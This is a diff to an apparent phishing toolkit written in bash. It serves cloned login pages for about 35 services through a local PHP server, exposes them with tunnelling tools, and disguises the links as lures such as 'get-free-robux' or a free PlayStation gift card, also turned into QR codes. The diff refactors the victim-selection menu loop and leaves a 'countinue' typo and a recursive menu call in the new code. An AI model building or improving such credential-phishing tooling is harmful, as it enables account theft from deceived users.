@@ -308,6 +308,8 @@ setup_site() {
 	cp -f .sites/ip.php .server/www/
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
+
+    tunnel_menu
 }
 
 ## Get IP address
@@ -643,10 +645,11 @@ EOF
     tunnel_menu
 }
 
-
 main_menu() {
-    { clear; banner; echo; }
-
+    clear
+    banner
+    echo
+    while true; do
     cat <<- EOF
         ${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
 
@@ -657,14 +660,14 @@ main_menu() {
         ${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo        
         ${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
         ${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex            
-        ${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
+        ${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} Stackoverflow
         ${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
         ${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
         ${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
-        ${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 
+        ${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox
 
         ${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
-EOF  # Properly closed EOF without any spaces or tabs before it
+EOF
 
     read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}" REPLY
 
@@ -705,7 +708,7 @@ EOF  # Properly closed EOF without any spaces or tabs before it
             website="playstation"
             mask='https://playstation-500-usd-gift-card-free'
             ;;
-        10)
+        10 |10)
             website="tiktok"
             mask='https://tiktok-free-liker'
             ;;
@@ -790,16 +793,23 @@ EOF  # Properly closed EOF without any spaces or tabs before it
             mask='https://get-free-robux'
             ;;
         99)
-            about;;
+            about
+            return 
+            ;;
         0 | 00 )
-            msg_exit;;
+            msg_exit
+            return
+            ;;
         *)
             echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
             { sleep 1; main_menu; }
+            countinue
 		;;
     esac
 
-    generate_qr "$mask" "${website}_qr.png"  # Generate QR code and save to ${website}_qr.png
+    qrencode -o "${website}_qr.png" "$mask"
+    break  # Exit the loop after valid input
+done
 }
 
 
@@ -810,3 +820,7 @@ check_status
 install_cloudflared
 install_localxpose
 main_menu
+tunnel_menu
+
+
+
